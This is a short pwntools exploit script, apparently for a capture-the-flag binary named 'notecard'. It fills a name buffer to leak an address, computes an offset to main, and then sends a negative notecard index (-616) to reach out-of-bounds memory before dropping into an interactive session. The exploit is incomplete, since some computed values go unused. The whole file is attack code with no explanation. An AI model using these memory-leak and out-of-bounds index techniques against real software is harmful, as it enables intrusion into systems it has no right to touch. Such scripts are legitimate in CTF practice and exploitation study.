from pwn import *
p = process("./notecard")
context.log_level = "debug"
context.arch ="amd64"
name = b'a' * 0x20
p.sendlineafter("Please enter your name:", name)

p.sendlineafter("Change it? (y/n)?",b'n')


func_exit = p.recv(0x1)

func_exit = p.recv(0x1e)

func_exit = u64(p.recv(0x6).ljust(8,b'\x00'))

success(hex(func_exit))

main = func_exit + 0x10ba
malloc_offset = -616


p.sendlineafter("> ",b'2')

p.sendlineafter("Notecard number (0 - 4): ",str(-616))
p.recv()

#gdb.attach(p)

p.interactive()


